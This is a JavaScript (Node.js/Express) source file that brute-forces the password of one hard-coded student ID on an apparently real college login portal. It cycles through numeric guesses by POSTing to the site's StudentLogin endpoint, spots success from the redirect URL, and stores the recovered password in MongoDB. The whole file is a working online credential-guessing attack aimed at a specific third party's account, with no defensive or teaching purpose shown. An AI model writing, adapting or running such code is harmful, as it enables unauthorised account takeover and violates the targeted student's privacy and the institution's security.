import Password from "./PawwordSchema.js";
import mongoose from "mongoose";
import dotenv from "dotenv";
import express from "express";
import fetch from "node-fetch";

dotenv.config({ path: "./.env" });

const app = express();
const port = 3000;

let i;
let isInitiated;
const username = 2412232;
const fail_url = "https://agclms.in/Elogin/StudentLogin";
const succ_url = "https://agclms.in/DashBoardStudent";
let totalDigit = 3;

async function connectDB() {
  if (mongoose.connection.readyState === 0) {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log("Connected to MongoDB");
  }
}

app.get("/", (req, res) => {
  if (isInitiated) return res.send(`Initiated, current check ${i}`);
  isInitiated = true;
  main();
  res.send("Initiated");
});

app.listen(port, () => {
  console.log(`App listening on port ${port}`);
});

function nextComb(str) {
  if (str[0] === "9") {
    totalDigit++;
    return "0".repeat(totalDigit);
  }

  let arr = str.split("");

  for (let i = arr.length - 1; i >= 0; i--) {
    if (arr[i] === "9") {
      arr[i] = "0";
    } else {
      arr[i] = (parseInt(arr[i]) + 1).toString();
      break;
    }
  }

  return arr.join("");
}

const main = async () => {
  try {
    let str = "999";

    for (let i = 0; i < 10000; i++) {
      const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
        method: "POST",
        headers: {
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
          "Content-Type": "application/x-www-form-urlencoded",
          "Cache-Control": "max-age=0",
        },
        referrer: "https://agclms.in/Elogin/StudentLogin",
        body: `StudentId=${username}&Password=${str}&__RequestVerificationToken=YOUR_TOKEN_HERE`,
      });

      if (response.url === fail_url) {
        console.log(`Attempted: ${str}`);
      } else if (response.url === succ_url) {
        await connectDB();
        console.log(`Password found: ${str}`);

        const password = new Password({ password: str });
        await password.save();
        return;
      } else {
        console.error("Unexpected URL:", response.url);
        return;
      }

      str = nextComb(str);
    }
  } catch {}
};
